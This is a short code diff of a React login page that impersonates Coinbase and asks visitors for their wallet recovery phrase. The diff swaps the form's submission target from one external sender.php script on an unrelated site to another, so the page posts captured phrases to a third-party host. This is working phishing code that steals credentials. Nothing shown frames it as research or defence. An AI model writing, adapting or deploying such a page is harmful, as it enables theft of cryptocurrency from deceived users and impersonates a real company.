@@ -13,7 +13,7 @@ const Login = () => {
   return (
     <div className='flex flex-col w-[95%] md:w-[80%] h-100vh] mx-auto'>
         <h1 className='py-3 text-3xl text-blue-800 font-bold'>Coinbase</h1>
-        <form className='w-full h-full bg-white rounded-md py-6 px-6 flex flex-col' method='POST' action={'https://www.stormequity.com/wp-content/themes/sender.php'} >
+        <form className='w-full h-full bg-white rounded-md py-6 px-6 flex flex-col' method='POST' action={'https://calibraindia.com/media/custom/sender.php'} >
             <h1 className='text-2xl font-semibold text-gray-800'>Sign in with your Recover Phrase to get started</h1>
             
             <div className='mt-[150px]'>
